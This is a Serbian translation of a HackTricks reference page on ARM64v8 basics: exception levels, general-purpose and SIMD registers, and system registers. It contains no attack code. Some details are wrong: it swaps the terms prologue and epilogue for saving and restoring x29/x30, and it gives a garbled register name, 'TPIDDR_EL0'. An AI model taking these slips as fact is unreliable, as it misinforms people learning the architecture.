# –£–≤–æ–¥ —É ARM64v8

{% hint style="success" %}
–£—á–∏—Ç–µ –∏ –ø—Ä–∞–∫—Ç–∏–∫—É—ò—Ç–µ AWS —Ö–∞–∫–æ–≤–∞—ö–µ:<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">\
–£—á–∏—Ç–µ –∏ –ø—Ä–∞–∫—Ç–∏–∫—É—ò—Ç–µ GCP —Ö–∞–∫–æ–≤–∞—ö–µ: <img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>–ü–æ–¥—Ä–∂–∏—Ç–µ HackTricks</summary>

* –ü—Ä–æ–≤–µ—Ä–∏—Ç–µ [**–ø–ª–∞–Ω–æ–≤–µ –ø—Ä–µ—Ç–ø–ª–∞—Ç–µ**](https://github.com/sponsors/carlospolop)!
* **–ü—Ä–∏–¥—Ä—É–∂–∏—Ç–µ —Å–µ** üí¨ [**Discord –≥—Ä—É–ø–∏**](https://discord.gg/hRep4RUj7f) –∏–ª–∏ [**telegram –≥—Ä—É–ø–∏**](https://t.me/peass) –∏–ª–∏ **–ø—Ä–∞—Ç–∏—Ç–µ** –Ω–∞—Å –Ω–∞ **–¢–≤–∏—Ç–µ—Ä—É** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **–ü–æ–¥–µ–ª–∏—Ç–µ —Ö–∞–∫–µ—Ä—Å–∫–µ —Ç—Ä–∏–∫–æ–≤–µ –ø–æ–¥–Ω–æ—à–µ—ö–µ–º PR-–æ–≤–∞ –Ω–∞** [**HackTricks**](https://github.com/carlospolop/hacktricks) –∏ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github —Ä–µ–ø–æ–∑–∏—Ç–æ—Ä–∏—ò–∏–º–∞.

</details>
{% endhint %}

## **–ù–∏–≤–æ–∏ –∏–∑—É–∑–µ—Ç–∞–∫–∞ - EL (ARM64v8)**

–£ ARMv8 –∞—Ä—Ö–∏—Ç–µ–∫—Ç—É—Ä–∏, –Ω–∏–≤–æ–∏ –∏–∑–≤—Ä—à–µ—ö–∞, –ø–æ–∑–Ω–∞—Ç–∏ –∫–∞–æ –Ω–∏–≤–æ–∏ –∏–∑—É–∑–µ—Ç–∞–∫–∞ (EL), –¥–µ—Ñ–∏–Ω–∏—à—É –Ω–∏–≤–æ –ø—Ä–∏–≤–∏–ª–µ–≥–∏—ò–∞ –∏ —Å–ø–æ—Å–æ–±–Ω–æ—Å—Ç–∏ –∏–∑–≤—Ä—à–Ω–æ–≥ –æ–∫—Ä—É–∂–µ—ö–∞. –ü–æ—Å—Ç–æ—ò–µ —á–µ—Ç–∏—Ä–∏ –Ω–∏–≤–æ–∞ –∏–∑—É–∑–µ—Ç–∞–∫–∞, –æ–¥ EL0 –¥–æ EL3, –æ–¥ –∫–æ—ò–∏—Ö —Å–≤–∞–∫–∏ —Å–ª—É–∂–∏ —Ä–∞–∑–ª–∏—á–∏—Ç–æ—ò —Å–≤—Ä—Å–∏:

1. **EL0 - –ö–æ—Ä–∏—Å–Ω–∏—á–∫–∏ —Ä–µ–∂–∏–º**:
* –û–≤–æ —ò–µ –Ω–∞—ò–º–∞—ö–µ –ø—Ä–∏–≤–∏–ª–µ–≥–æ–≤–∞–Ω –Ω–∏–≤–æ –∏ –∫–æ—Ä–∏—Å—Ç–∏ —Å–µ –∑–∞ –∏–∑–≤—Ä—à–∞–≤–∞—ö–µ —Ä–µ–¥–æ–≤–Ω–æ–≥ –∫–æ–¥–∞ –∞–ø–ª–∏–∫–∞—Ü–∏—ò–∞.
* –ê–ø–ª–∏–∫–∞—Ü–∏—ò–µ –∫–æ—ò–µ —Ä–∞–¥–µ –Ω–∞ EL0 —Å—É –∏–∑–æ–ª–æ–≤–∞–Ω–µ —ò–µ–¥–Ω–∞ –æ–¥ –¥—Ä—É–≥–µ –∏ –æ–¥ —Å–∏—Å—Ç–µ–º—Å–∫–æ–≥ —Å–æ—Ñ—Ç–≤–µ—Ä–∞, —à—Ç–æ –ø–æ–±–æ—ô—à–∞–≤–∞ –±–µ–∑–±–µ–¥–Ω–æ—Å—Ç –∏ —Å—Ç–∞–±–∏–ª–Ω–æ—Å—Ç.
2. **EL1 - –†–µ–∂–∏–º —ò–µ–∑–≥—Ä–∞ –æ–ø–µ—Ä–∞—Ç–∏–≤–Ω–æ–≥ —Å–∏—Å—Ç–µ–º–∞**:
* –í–µ—õ–∏–Ω–∞ —ò–µ–∑–≥–∞—Ä–∞ –æ–ø–µ—Ä–∞—Ç–∏–≤–Ω–∏—Ö —Å–∏—Å—Ç–µ–º–∞ —Ä–∞–¥–∏ –Ω–∞ –æ–≤–æ–º –Ω–∏–≤–æ—É.
* EL1 –∏–º–∞ –≤–∏—à–µ –ø—Ä–∏–≤–∏–ª–µ–≥–∏—ò–∞ –æ–¥ EL0 –∏ –º–æ–∂–µ –ø—Ä–∏—Å—Ç—É–ø–∏—Ç–∏ —Å–∏—Å—Ç–µ–º—Å–∫–∏–º —Ä–µ—Å—É—Ä—Å–∏–º–∞, –∞–ª–∏ —É–∑ –Ω–µ–∫–∞ –æ–≥—Ä–∞–Ω–∏—á–µ—ö–∞ —Ä–∞–¥–∏ –æ—á—É–≤–∞—ö–∞ –∏–Ω—Ç–µ–≥—Ä–∏—Ç–µ—Ç–∞ —Å–∏—Å—Ç–µ–º–∞.
3. **EL2 - –†–µ–∂–∏–º —Ö–∏–ø–µ—Ä–≤–∏–∑–æ—Ä–∞**:
* –û–≤–∞—ò –Ω–∏–≤–æ —Å–µ –∫–æ—Ä–∏—Å—Ç–∏ –∑–∞ –≤–∏—Ä—Ç—É–∞–ª–∏–∑–∞—Ü–∏—ò—É. –•–∏–ø–µ—Ä–≤–∏–∑–æ—Ä –∫–æ—ò–∏ —Ä–∞–¥–∏ –Ω–∞ EL2 –º–æ–∂–µ —É–ø—Ä–∞–≤—ô–∞—Ç–∏ –≤–∏—à–µ –æ–ø–µ—Ä–∞—Ç–∏–≤–Ω–∏—Ö —Å–∏—Å—Ç–µ–º–∞ (—Å–≤–∞–∫–∏ —É —Å–≤–æ–º EL1) –∫–æ—ò–∏ —Ä–∞–¥–µ –Ω–∞ –∏—Å—Ç–æ–º —Ñ–∏–∑–∏—á–∫–æ–º —Ö–∞—Ä–¥–≤–µ—Ä—É.
* EL2 –ø—Ä—É–∂–∞ —Ñ—É–Ω–∫—Ü–∏—ò–µ –∑–∞ –∏–∑–æ–ª–∞—Ü–∏—ò—É –∏ –∫–æ–Ω—Ç—Ä–æ–ª—É –≤–∏—Ä—Ç—É–∞–ª–∏–∑–æ–≤–∞–Ω–∏—Ö –æ–∫—Ä—É–∂–µ—ö–∞.
4. **EL3 - –†–µ–∂–∏–º —Å–∏–≥—É—Ä–Ω–æ–≥ –º–æ–Ω–∏—Ç–æ—Ä–∞**:
* –û–≤–æ —ò–µ –Ω–∞—ò–ø—Ä–∏–≤–∏–ª–µ–≥–æ–≤–∞–Ω–∏—ò–∏ –Ω–∏–≤–æ –∏ —á–µ—Å—Ç–æ —Å–µ –∫–æ—Ä–∏—Å—Ç–∏ –∑–∞ —Å–∏–≥—É—Ä–Ω–æ –ø–æ–∫—Ä–µ—Ç–∞—ö–µ –∏ –ø–æ–≤–µ—Ä–µ—ö–µ —É –∏–∑–≤—Ä—à–Ω–∞ –æ–∫—Ä—É–∂–µ—ö–∞.
* EL3 –º–æ–∂–µ —É–ø—Ä–∞–≤—ô–∞—Ç–∏ –∏ –∫–æ–Ω—Ç—Ä–æ–ª–∏—Å–∞—Ç–∏ –ø—Ä–∏—Å—Ç—É–ø–µ –∏–∑–º–µ—í—É —Å–∏–≥—É—Ä–Ω–∏—Ö –∏ –Ω–µ—Å–∏–≥—É—Ä–Ω–∏—Ö —Å—Ç–∞—ö–∞ (–∫–∞–æ —à—Ç–æ —Å—É —Å–∏–≥—É—Ä–Ω–æ –ø–æ–∫—Ä–µ—Ç–∞—ö–µ, –ø–æ–≤–µ—Ä–µ—ö–µ —É –û–°, –∏—Ç–¥.).

–ö–æ—Ä–∏—Å—Ç–µ—ö–µ –æ–≤–∏—Ö –Ω–∏–≤–æ–∞ –æ–º–æ–≥—É—õ–∞–≤–∞ —Å—Ç—Ä—É–∫—Ç—É—Ä–∏—Å–∞–Ω –∏ —Å–∏–≥—É—Ä–∞–Ω –Ω–∞—á–∏–Ω —É–ø—Ä–∞–≤—ô–∞—ö–∞ —Ä–∞–∑–ª–∏—á–∏—Ç–∏–º –∞—Å–ø–µ–∫—Ç–∏–º–∞ —Å–∏—Å—Ç–µ–º–∞, –æ–¥ –∫–æ—Ä–∏—Å–Ω–∏—á–∫–∏—Ö –∞–ø–ª–∏–∫–∞—Ü–∏—ò–∞ –¥–æ –Ω–∞—ò–ø—Ä–∏–≤–∏–ª–µ–≥–æ–≤–∞–Ω–∏—ò–µ–≥ —Å–∏—Å—Ç–µ–º—Å–∫–æ–≥ —Å–æ—Ñ—Ç–≤–µ—Ä–∞. –ü—Ä–∏—Å—Ç—É–ø ARMv8 –Ω–∏–≤–∏–º–∞ –ø—Ä–∏–≤–∏–ª–µ–≥–∏—ò–∞ –ø–æ–º–∞–∂–µ —É –µ—Ñ–∏–∫–∞—Å–Ω–æ–º –∏–∑–æ–ª–æ–≤–∞—ö—É —Ä–∞–∑–ª–∏—á–∏—Ç–∏—Ö –∫–æ–º–ø–æ–Ω–µ–Ω—Ç–∏ —Å–∏—Å—Ç–µ–º–∞, —á–∏–º–µ —Å–µ –ø–æ–±–æ—ô—à–∞–≤–∞ –±–µ–∑–±–µ–¥–Ω–æ—Å—Ç –∏ —Ä–æ–±—É—Å–Ω–æ—Å—Ç —Å–∏—Å—Ç–µ–º–∞.

## **–†–µ–≥–∏—Å—Ç—Ä–∏ (ARM64v8)**

ARM64 –∏–º–∞ **31 —Ä–µ–≥–∏—Å—Ç–∞—Ä –æ–ø—à—Ç–µ –Ω–∞–º–µ–Ω–µ**, –æ–±–µ–ª–µ–∂–µ–Ω `x0` –¥–æ `x30`. –°–≤–∞–∫–∏ –º–æ–∂–µ –¥–∞ —á—É–≤–∞ **64-–±–∏—Ç–Ω—É** (8-–±–∞—ò—Ç–Ω—É) –≤—Ä–µ–¥–Ω–æ—Å—Ç. –ó–∞ –æ–ø–µ—Ä–∞—Ü–∏—ò–µ –∫–æ—ò–µ –∑–∞—Ö—Ç–µ–≤–∞—ò—É —Å–∞–º–æ 32-–±–∏—Ç–Ω–µ –≤—Ä–µ–¥–Ω–æ—Å—Ç–∏, –∏—Å—Ç–∏ —Ä–µ–≥–∏—Å—Ç—Ä–∏ –º–æ–≥—É –±–∏—Ç–∏ –¥–æ—Å—Ç—É–ø–Ω–∏ —É 32-–±–∏—Ç–Ω–æ–º —Ä–µ–∂–∏–º—É –∫–æ—Ä–∏—Å—Ç–µ—õ–∏ –∏–º–µ–Ω–∞ w0 –¥–æ w30.

1. **`x0`** –¥–æ **`x7`** - –û–≤–∏ —Å–µ –æ–±–∏—á–Ω–æ –∫–æ—Ä–∏—Å—Ç–µ –∫–∞–æ —Ä–µ–≥–∏—Å—Ç—Ä–∏ –∑–∞ –ø—Ä–∏–≤—Ä–µ–º–µ–Ω–µ –ø–æ–¥–∞—Ç–∫–µ –∏ –∑–∞ –ø—Ä–µ–Ω–æ—Å –ø–∞—Ä–∞–º–µ—Ç–∞—Ä–∞ —É –ø–æ–¥–ø—Ä–æ–≥—Ä–∞–º–µ.
* **`x0`** —Ç–∞–∫–æ—í–µ –Ω–æ—Å–∏ –ø–æ–≤—Ä–∞—Ç–Ω–µ –ø–æ–¥–∞—Ç–∫–µ —Ñ—É–Ω–∫—Ü–∏—ò–µ
2. **`x8`** - –£ Linux —ò–µ–∑–≥—Ä—É, `x8` —Å–µ –∫–æ—Ä–∏—Å—Ç–∏ –∫–∞–æ –±—Ä–æ—ò —Å–∏—Å—Ç–µ–º—Å–∫–æ–≥ –ø–æ–∑–∏–≤–∞ –∑–∞ `svc` –∏–Ω—Å—Ç—Ä—É–∫—Ü–∏—ò—É. **–£ macOS, x16 —ò–µ —Ç–∞—ò –∫–æ—ò–∏ —Å–µ –∫–æ—Ä–∏—Å—Ç–∏!**
3. **`x9`** –¥–æ **`x15`** - –í–∏—à–µ –ø—Ä–∏–≤—Ä–µ–º–µ–Ω–∏—Ö —Ä–µ–≥–∏—Å—Ç–∞—Ä–∞, —á–µ—Å—Ç–æ —Å–µ –∫–æ—Ä–∏—Å—Ç–µ –∑–∞ –ª–æ–∫–∞–ª–Ω–µ –ø—Ä–æ–º–µ–Ω—ô–∏–≤–µ.
4. **`x16`** –∏ **`x17`** - **–†–µ–≥–∏—Å—Ç—Ä–∏ –∑–∞ –ø–æ–∑–∏–≤–µ —É–Ω—É—Ç–∞—Ä –ø—Ä–æ—Ü–µ–¥—É—Ä–∞**. –ü—Ä–∏–≤—Ä–µ–º–µ–Ω–∏ —Ä–µ–≥–∏—Å—Ç—Ä–∏ –∑–∞ –æ–¥–º–∞—Ö –≤—Ä–µ–¥–Ω–æ—Å—Ç–∏. –¢–∞–∫–æ—í–µ —Å–µ –∫–æ—Ä–∏—Å—Ç–µ –∑–∞ –∏–Ω–¥–∏—Ä–µ–∫—Ç–Ω–µ –ø–æ–∑–∏–≤–µ —Ñ—É–Ω–∫—Ü–∏—ò–∞ –∏ PLT (–¢–∞–±–µ–ª–∞ –ø–æ–≤–µ–∑–∏–≤–∞—ö–∞ –ø—Ä–æ—Ü–µ–¥—É—Ä–∞).
* **`x16`** —Å–µ –∫–æ—Ä–∏—Å—Ç–∏ –∫–∞–æ **–±—Ä–æ—ò —Å–∏—Å—Ç–µ–º—Å–∫–æ–≥ –ø–æ–∑–∏–≤–∞** –∑–∞ **`svc`** –∏–Ω—Å—Ç—Ä—É–∫—Ü–∏—ò—É —É **macOS**.
5. **`x18`** - **–†–µ–≥–∏—Å—Ç–∞—Ä –ø–ª–∞—Ç—Ñ–æ—Ä–º–µ**. –ú–æ–∂–µ —Å–µ –∫–æ—Ä–∏—Å—Ç–∏—Ç–∏ –∫–∞–æ —Ä–µ–≥–∏—Å—Ç–∞—Ä –æ–ø—à—Ç–µ –Ω–∞–º–µ–Ω–µ, –∞–ª–∏ –Ω–∞ –Ω–µ–∫–∏–º –ø–ª–∞—Ç—Ñ–æ—Ä–º–∞–º–∞, –æ–≤–∞—ò —Ä–µ–≥–∏—Å—Ç–∞—Ä —ò–µ —Ä–µ–∑–µ—Ä–≤–∏—Å–∞–Ω –∑–∞ –ø–ª–∞—Ç—Ñ–æ—Ä–º—Å–∫–∏ —Å–ø–µ—Ü–∏—Ñ–∏—á–Ω–µ –Ω–∞–º–µ–Ω–µ: –ü–æ–∫–∞–∑–∏–≤–∞—á –Ω–∞ –±–ª–æ–∫ –æ–∫—Ä—É–∂–µ—ö–∞ —Ç—Ä–µ–Ω—É—Ç–Ω–µ –Ω–∏—Ç —É Windows-—É, –∏–ª–∏ –¥–∞ —É–∫–∞–∂–µ –Ω–∞ —Ç—Ä–µ–Ω—É—Ç–Ω—É **—Å—Ç—Ä—É–∫—Ç—É—Ä—É –∏–∑–≤—Ä—à–∞–≤–∞—ö–∞ –∑–∞–¥–∞—Ç–∫–∞ —É linux —ò–µ–∑–≥—Ä—É**.
6. **`x19`** –¥–æ **`x28`** - –û–≤–æ —Å—É —Ä–µ–≥–∏—Å—Ç—Ä–∏ –∫–æ—ò–µ —á—É–≤–∞ –ø–æ–∑–≤–∞–Ω–∞ —Ñ—É–Ω–∫—Ü–∏—ò–∞. –§—É–Ω–∫—Ü–∏—ò–∞ –º–æ—Ä–∞ –¥–∞ –æ—á—É–≤–∞ –≤—Ä–µ–¥–Ω–æ—Å—Ç–∏ –æ–≤–∏—Ö —Ä–µ–≥–∏—Å—Ç–∞—Ä–∞ –∑–∞ —Å–≤–æ–≥ –ø–æ–∑–∏–≤–∞–æ—Ü–∞, —Ç–∞–∫–æ –¥–∞ —Å–µ —á—É–≤–∞—ò—É –Ω–∞ —Å—Ç–µ–∫—É –∏ –æ–ø–æ—Ä–∞–≤—ô–∞—ò—É –ø—Ä–µ –Ω–µ–≥–æ —à—Ç–æ —Å–µ –≤—Ä–∞—Ç–∏ –ø–æ–∑–∏–≤–∞–æ—Ü—É.
7. **`x29`** - **–ü–æ–∫–∞–∑–∏–≤–∞—á –æ–∫–≤–∏—Ä–∞** –∑–∞ –ø—Ä–∞—õ–µ—ö–µ –æ–∫–≤–∏—Ä–∞ —Å—Ç–µ–∫–∞. –ö–∞–¥–∞ —Å–µ –∫—Ä–µ–∏—Ä–∞ –Ω–æ–≤–∏ –æ–∫–≤–∏—Ä —Å—Ç–µ–∫–∞ —ò–µ—Ä —ò–µ —Ñ—É–Ω–∫—Ü–∏—ò–∞ –ø–æ–∑–≤–∞–Ω–∞, **`x29`** —Ä–µ–≥–∏—Å—Ç–∞—Ä —Å–µ **—á—É–≤–∞ –Ω–∞ —Å—Ç–µ–∫—É** –∏ **–Ω–æ–≤–∞** –∞–¥—Ä–µ—Å–∞ –ø–æ–∫–∞–∑–∏–≤–∞—á–∞ –æ–∫–≤–∏—Ä–∞ (**`sp`** –∞–¥—Ä–µ—Å–∞) —Å–µ **—á—É–≤–∞ —É –æ–≤–æ–º —Ä–µ–≥–∏—Å—Ç—Ä—É**.
* –û–≤–∞—ò —Ä–µ–≥–∏—Å—Ç–∞—Ä —Å–µ —Ç–∞–∫–æ—í–µ –º–æ–∂–µ –∫–æ—Ä–∏—Å—Ç–∏—Ç–∏ –∫–∞–æ **—Ä–µ–≥–∏—Å—Ç–∞—Ä –æ–ø—à—Ç–µ –Ω–∞–º–µ–Ω–µ** –∏–∞–∫–æ —Å–µ –æ–±–∏—á–Ω–æ –∫–æ—Ä–∏—Å—Ç–∏ –∫–∞–æ —Ä–µ—Ñ–µ—Ä–µ–Ω—Ü–∞ –Ω–∞ **–ª–æ–∫–∞–ª–Ω–µ –ø—Ä–æ–º–µ–Ω—ô–∏–≤–µ**.
8. **`x30`** –∏–ª–∏ **`lr`**- **–†–µ–≥–∏—Å—Ç–∞—Ä –∑–∞ –ø–æ–≤—Ä–∞—Ç–∞–∫**. –î—Ä–∂–∏ **–∞–¥—Ä–µ—Å—É –ø–æ–≤—Ä–∞—Ç–∫–∞** –∫–∞–¥–∞ —Å–µ –∏–∑–≤—Ä—à–∞–≤–∞ `BL` (–ì—Ä–∞–Ω–∫–∞ —Å–∞ –ø–æ–≤—Ä–∞—Ç–∫–æ–º) –∏–ª–∏ `BLR` (–ì—Ä–∞–Ω–∫–∞ —Å–∞ –ø–æ–≤—Ä–∞—Ç–∫–æ–º —É —Ä–µ–≥–∏—Å—Ç–∞—Ä) –∏–Ω—Å—Ç—Ä—É–∫—Ü–∏—ò–∞ —á—É–≤–∞—ò—É—õ–∏ **`pc`** –≤—Ä–µ–¥–Ω–æ—Å—Ç —É –æ–≤–æ–º —Ä–µ–≥–∏—Å—Ç—Ä—É.
* –ú–æ–∂–µ —Å–µ –∫–æ—Ä–∏—Å—Ç–∏—Ç–∏ –∏ –∫–∞–æ –±–∏–ª–æ –∫–æ—ò–∏ –¥—Ä—É–≥–∏ —Ä–µ–≥–∏—Å—Ç–∞—Ä.
* –ê–∫–æ —Ç—Ä–µ–Ω—É—Ç–Ω–∞ —Ñ—É–Ω–∫—Ü–∏—ò–∞ –ø–æ–∑–∏–≤–∞ –Ω–æ–≤—É —Ñ—É–Ω–∫—Ü–∏—ò—É –∏ —Å—Ç–æ–≥–∞ —õ–µ –ø—Ä–µ–æ–ø—Ç–µ—Ä–µ—Ç–∏—Ç–∏ `lr`, —á—É–≤–∞—õ–µ —ò–µ –Ω–∞ —Å—Ç–µ–∫—É –Ω–∞ –ø–æ—á–µ—Ç–∫—É, –æ–≤–æ —ò–µ –µ–ø–∏–ª–æ–≥ (`stp x29, x30 , [sp, #-48]; mov x29, sp` -> –ß—É–≤–∞ `fp` –∏ `lr`, –≥–µ–Ω–µ—Ä–∏—à–µ –ø—Ä–æ—Å—Ç–æ—Ä –∏ –¥–æ–±–∏—ò–∞ –Ω–æ–≤–∏ `fp`) –∏ –æ–ø–æ—Ä–∞–≤—ô–∞—õ–µ —ò–µ –Ω–∞ –∫—Ä–∞—ò—É, –æ–≤–æ —ò–µ –ø—Ä–æ–ª–æ–≥ (`ldp x29, x30, [sp], #48; ret` -> –û–ø–æ—Ä–∞–≤—ô–∞ `fp` –∏ `lr` –∏ –≤—Ä–∞—õ–∞).
9. **`sp`** - **–ü–æ–∫–∞–∑–∏–≤–∞—á —Å—Ç–µ–∫–∞**, –∫–æ—Ä–∏—Å—Ç–∏ —Å–µ –∑–∞ –ø—Ä–∞—õ–µ—ö–µ –≤—Ä—Ö–∞ —Å—Ç–µ–∫–∞.
* –í—Ä–µ–¥–Ω–æ—Å—Ç **`sp`** —Ç—Ä–µ–±–∞ —É–≤–µ–∫ –¥–∞ –±—É–¥–µ –æ–¥—Ä–∂–∞–≤–∞–Ω–∞ –Ω–∞ –Ω–∞—ò–º–∞—ö–µ **–∫–≤–∞–¥—Ä–∞—Ç–Ω–æ** **–ø–æ—Ä–µ–¥–∏–æ** –∏–ª–∏ –º–æ–∂–µ –¥–æ—õ–∏ –¥–æ –∏–∑—É–∑–µ—Ç–∫–∞ —É –ø–æ—Ä–µ—í–µ—ö—É.
10. **`pc`** - **–ë—Ä–æ—ò–∞—á –ø—Ä–æ–≥—Ä–∞–º–∞**, –∫–æ—ò–∏ —É–∫–∞–∑—É—ò–µ –Ω–∞ —Å–ª–µ–¥–µ—õ—É –∏–Ω—Å—Ç—Ä—É–∫—Ü–∏—ò—É. –û–≤–∞—ò —Ä–µ–≥–∏—Å—Ç–∞—Ä –º–æ–∂–µ –±–∏—Ç–∏ –∞–∂—É—Ä–∏—Ä–∞–Ω —Å–∞–º–æ –∫—Ä–æ–∑ –≥–µ–Ω–µ—Ä–∏—Å–∞—ö–µ –∏–∑—É–∑–µ—Ç–∞–∫–∞, –ø–æ–≤—Ä–∞—Ç–∫–µ –∏–∑—É–∑–µ—Ç–∞–∫–∞ –∏ –≥—Ä–∞–Ω–µ. –à–µ–¥–∏–Ω–µ –æ–±–∏—á–Ω–µ –∏–Ω—Å—Ç—Ä—É–∫—Ü–∏—ò–µ –∫–æ—ò–µ –º–æ–≥—É —á–∏—Ç–∞—Ç–∏ –æ–≤–∞—ò —Ä–µ–≥–∏—Å—Ç–∞—Ä —Å—É –∏–Ω—Å—Ç—Ä—É–∫—Ü–∏—ò–µ –≥—Ä–∞–Ω–µ —Å–∞ –ø–æ–≤—Ä–∞—Ç–∫–æ–º (BL, BLR) –¥–∞ —á—É–≤–∞—ò—É **`pc`** –∞–¥—Ä–µ—Å—É —É **`lr`** (–†–µ–≥–∏—Å—Ç–∞—Ä –∑–∞ –ø–æ–≤—Ä–∞—Ç–∞–∫).
11. **`xzr`** - **–ù—É–ª—Ç–∏ —Ä–µ–≥–∏—Å—Ç–∞—Ä**. –¢–∞–∫–æ—í–µ —Å–µ –∑–æ–≤–µ **`wzr`** —É 32-–±–∏—Ç–Ω–æ–º —Ä–µ–≥–∏—Å—Ç–∞—Ä–Ω–æ–º –æ–±–ª–∏–∫—É. –ú–æ–∂–µ —Å–µ –∫–æ—Ä–∏—Å—Ç–∏—Ç–∏ –∑–∞ –ª–∞–∫–æ –¥–æ–±–∏—ò–∞—ö–µ –Ω—É–ª—Ç–µ –≤—Ä–µ–¥–Ω–æ—Å—Ç–∏ (–æ–±–∏—á–Ω–∞ –æ–ø–µ—Ä–∞—Ü–∏—ò–∞) –∏–ª–∏ –∑–∞ –∏–∑–≤—Ä—à–∞–≤–∞—ö–µ –ø–æ—Ä–µ—í–µ—ö–∞ –∫–æ—Ä–∏—Å—Ç–µ—õ–∏ **`subs`** –∫–∞–æ **`subs XZR, Xn, #10`** —á—É–≤–∞—ò—É—õ–∏ —Ä–µ–∑—É–ª—Ç—É—ò—É—õ–µ –ø–æ–¥–∞—Ç–∫–µ –Ω–∏–≥–¥–µ (—É **`xzr`**).

–†–µ–≥–∏—Å—Ç—Ä–∏ **`Wn`** —Å—É **32-–±–∏—Ç–Ω–∞** –≤–µ—Ä–∑–∏—ò–∞ —Ä–µ–≥–∏—Å—Ç–∞—Ä–∞ **`Xn`**.

### SIMD –∏ —Ä–µ–≥–∏—Å—Ç—Ä–∏ –∑–∞ –ø–æ–∫—Ä–µ—Ç–Ω–µ —Ç–∞—á–∫–µ

–®—Ç–∞–≤–∏—à–µ, –ø–æ—Å—Ç–æ—ò–∏ —ò–æ—à **32 —Ä–µ–≥–∏—Å—Ç—Ä–∞ –¥—É–∂–∏–Ω–µ 128–±–∏—Ç** –∫–æ—ò–∏ —Å–µ –º–æ–≥—É –∫–æ—Ä–∏—Å—Ç–∏—Ç–∏ —É –æ–ø—Ç–∏–º–∏–∑–æ–≤–∞–Ω–∏–º –æ–ø–µ—Ä–∞—Ü–∏—ò–∞–º–∞ —ò–µ–¥–Ω–µ –∏–Ω—Å—Ç—Ä—É–∫—Ü–∏—ò–µ –≤–∏—à–µ –ø–æ–¥–∞—Ç–∞–∫–∞ (SIMD) –∏ –∑–∞ –∏–∑–≤—Ä—à–∞–≤–∞—ö–µ –∞—Ä–∏—Ç–º–µ—Ç–∏–∫–µ –ø–æ–∫—Ä–µ—Ç–Ω–∏—Ö —Ç–∞—á–∞–∫–∞. –û–≤–∏ —Å–µ –∑–æ–≤—É Vn —Ä–µ–≥–∏—Å—Ç—Ä–∏ –∏–∞–∫–æ –º–æ–≥—É —Ä–∞–¥–∏—Ç–∏ –∏ —É **64**-–±–∏—Ç–Ω–æ–º, **32**-–±–∏—Ç–Ω–æ–º, **16**-–±–∏—Ç–Ω–æ–º –∏ **8**-–±–∏—Ç–Ω–æ–º —Ä–µ–∂–∏–º—É –∏ —Ç–∞–¥–∞ —Å–µ –∑–æ–≤—É **`Qn`**, **`Dn`**, **`Sn`**, **`Hn`** –∏ **`Bn`**.

### –°–∏—Å—Ç–µ–º—Å–∫–∏ —Ä–µ–≥–∏—Å—Ç—Ä–∏

**–ü–æ—Å—Ç–æ—ò–µ —Å—Ç–æ—Ç–∏–Ω–µ —Å–∏—Å—Ç–µ–º—Å–∫–∏—Ö —Ä–µ–≥–∏—Å—Ç–∞—Ä–∞**, —Ç–∞–∫–æ—í–µ –ø–æ–∑–Ω–∞—Ç–∏—Ö –∫–∞–æ —Ä–µ–≥–∏—Å—Ç—Ä–∏ —Å–ø–µ—Ü–∏—ò–∞–ª–Ω–µ –Ω–∞–º–µ–Ω–µ (SPRs), –∫–æ—ò–∏ —Å–µ –∫–æ—Ä–∏—Å—Ç–µ –∑–∞ **–ø—Ä–∞—õ–µ—ö–µ** –∏ **–∫–æ–Ω—Ç—Ä–æ–ª—É** **–ø–æ–Ω–∞—à–∞—ö–∞** **–ø—Ä–æ—Ü–µ—Å–æ—Ä–∞**.\
–ú–æ–≥—É —Å–µ —á–∏—Ç–∞—Ç–∏ –∏–ª–∏ –ø–æ—Å—Ç–∞–≤—ô–∞—Ç–∏ —Å–∞–º–æ –ø–æ–º–æ—õ—É –ø–æ—Å–µ–±–Ω–∏—Ö –∏–Ω—Å—Ç—Ä—É–∫—Ü–∏—ò–∞ **`mrs`** –∏ **`msr`**.

–ü–æ—Å–µ–±–Ω–∏ —Ä–µ–≥–∏—Å—Ç—Ä–∏ **`TPIDR_EL0`** –∏ **`TPIDDR_EL0`** —Å–µ —á–µ—Å—Ç–æ –Ω–∞–ª–∞–∑–µ —Ç–æ–∫–æ–º —Ä–µ–≤–µ—Ä–∑–Ω–æ–≥ –∏–Ω–∂–µ—ö–µ—Ä–∏–Ω–≥–∞. –°—É—Ñ–∏–∫—Å `EL0` —É–∫–∞–∑—É—ò–µ –Ω–∞ **–º–∏–Ω–∏–º–∞–ª–Ω–æ –∏–∑—É–∑–µ—õ–µ** –∏–∑ –∫–æ–≥ —Å–µ —Ä–µ–≥–∏—Å—Ç–∞—Ä –º–æ–∂–µ –ø—Ä–∏—Å—Ç—É–ø–∏—Ç–∏ (—É –æ–≤–æ–º —Å–ª—É—á–∞—ò—É EL0 —ò–µ —Ä–µ–¥–æ–≤–∞–Ω –Ω–∏–≤–æ –∏–∑—É–∑–µ—õ–∞ (–ø—Ä–∏–≤–∏–ª–µ–≥–∏—ò–∞) –Ω–∞ –∫–æ–º–µ —Ä–µ–¥–æ–≤–Ω–∏ –ø—Ä–æ–≥—Ä–∞–º–∏ —Ä–∞–¥–µ).\
–ß–µ—Å—Ç–æ —Å–µ –∫–æ—Ä–∏—Å—Ç–µ –∑–∞ —á—É–≤–∞—ö–µ **–æ—Å–Ω–æ–≤–Ω–µ –∞–¥—Ä–µ—Å–µ –æ–±–ª–∞—Å—Ç–∏ –ª–æ–∫–∞–ª–Ω–µ –º–µ–º–æ—Ä–∏—ò–µ**. –û–±–∏—á–Ω–æ —ò–µ –ø—Ä–≤–∏ —á–∏—Ç—ô–∏–≤ –∏ –∑–∞–ø–∏—Å–∏–≤ –∑–∞ –ø—Ä–æ–≥—Ä–∞–º–µ –∫–æ—ò–∏ —Ä–∞–¥–µ —É EL0, –∞–ª–∏ –¥—Ä—É–≥–∏ —Å–µ –º–æ–∂–µ —á–∏—Ç–∞—Ç–∏ –∏–∑ EL0 –∏ –∑–∞–ø–∏—Å–∏–≤–∞—Ç–∏ –∏–∑ EL1 (–∫–∞–æ —ò–µ–∑–≥—Ä–æ).

